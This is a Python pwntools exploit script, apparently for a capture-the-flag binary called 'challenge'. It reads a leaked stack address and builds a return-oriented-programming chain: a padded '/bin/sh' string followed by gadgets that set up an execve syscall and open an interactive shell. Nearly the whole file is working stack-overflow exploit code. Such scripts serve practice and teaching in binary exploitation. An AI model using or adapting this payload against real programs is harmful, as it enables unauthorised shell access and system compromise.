#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template challenge
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "challenge")

context.terminal = ["terminator", "-e"]

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No
# Debuginfo:  Yes

io = start()

address = int(io.recvline().strip(), 16)

# https://ir0nstone.gitbook.io/notes/binexp/stack/syscalls/exploitation-with-syscalls
rop = ROP(exe)
payload = b"/bin/sh\x00".ljust(24, b"A")
payload += p64(rop.rdi.address)
payload += p64(address)
payload += p64(rop.rax.address)
payload += p64(0x3B)
payload += p64(rop.rsi.address)
payload += p64(0)
payload += p64(rop.rdx.address)
payload += p64(0)
payload += p64(rop.syscall.address)

io.sendline(payload)

io.interactive()
